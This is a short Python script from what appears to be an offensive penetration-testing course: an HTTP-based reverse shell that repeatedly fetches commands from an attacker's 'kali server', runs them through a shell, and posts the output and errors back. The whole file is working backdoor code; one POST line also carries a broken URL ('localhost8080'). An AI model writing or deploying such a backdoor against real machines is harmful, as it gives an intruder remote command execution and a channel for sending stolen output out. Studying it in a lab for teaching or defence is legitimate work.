# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import requests
import subprocess
import time

while True:

    req = requests.get('http://localhost:8080') # Send GET request to our kali server
    command = req.text # Store the received txt into command variable

    if 'terminate' in command:
        break

    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://localhost:8080', data=CMD.stdout.read()) # POST the result
        post_response = requests.post(url='http://localhost8080', data=CMD.stderr.read()) # or the error -if any-

    time.sleep(3)
